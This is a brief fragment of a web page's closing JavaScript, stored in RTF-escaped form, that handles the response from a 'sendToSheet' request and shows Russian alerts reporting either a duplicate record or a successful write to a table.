        let data = \{\}; try \{ data = JSON.parse(text); \} catch \{\}\
        if (!res.ok || !data.ok) throw new Error(data.error || text || "request failed");\
        if (data.duplicate) alert("\uc0\u9888 \u65039  \u1058 \u1072 \u1082 \u1072 \u1103  \u1079 \u1072 \u1087 \u1080 \u1089 \u1100  \u1091 \u1078 \u1077  \u1077 \u1089 \u1090 \u1100 .");\
        else alert("\uc0\u9989  \u1044 \u1072 \u1085 \u1085 \u1099 \u1077  \u1079 \u1072 \u1087 \u1080 \u1089 \u1072 \u1085 \u1099  \u1074  \u1090 \u1072 \u1073 \u1083 \u1080 \u1094 \u1091 .");\
      \} catch (err) \{\
        console.warn("sendToSheet error:", err);\
      \} finally \{\
        if (loading) loading.style.display = "none";\
      \}\
    \}\
  </script>\
</body>\
</html>
